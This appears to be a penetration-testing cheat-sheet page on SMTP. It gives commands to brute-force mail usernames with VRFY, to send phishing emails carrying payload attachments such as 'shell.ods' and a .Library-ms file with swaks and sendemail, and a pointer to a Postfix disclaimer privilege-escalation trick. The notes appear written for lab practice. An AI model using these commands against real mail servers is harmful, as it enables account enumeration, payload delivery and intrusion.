# SMTP Enumeration

### Smtp username bruteforce

```
smtp-user-enum -M VRFY -u test -t 192.168.167.199 -D supermagicorg.com
```

for users.list file use `-U`

### Send an email

{% code overflow="wrap" %}
```bash
sudo swaks -t user1@domain --from user2@domain --attach @config.Library-ms --server <ip> -body @body.txt -header "Subject:Problems" -ap
```
{% endcode %}

Add `-ap` for authentication

Or alternatively:

```
sendemail -f 'jonas@localhost' \
-t 'mailadmin@localhost' \
-s 192.168.219.140:25 \
-u 'a spreadsheet' \
-m 'Please check this spreadsheet' \
-a shell.ods  
```

Useful to send payloads.

### Postfix Disclaimer PrivEsc

If files like _**/etc/postfix/disclaimer**_ refer to [postfish](https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/postfish)&#x20;

When an address in `/etc/postfix/disclaimer_addresses` sends or receives emails the `/etc/postfix/disclaimer` gets executed. This file takes the contents of `/etc/postfix/disclaimer.txt` and appends it to the emails.
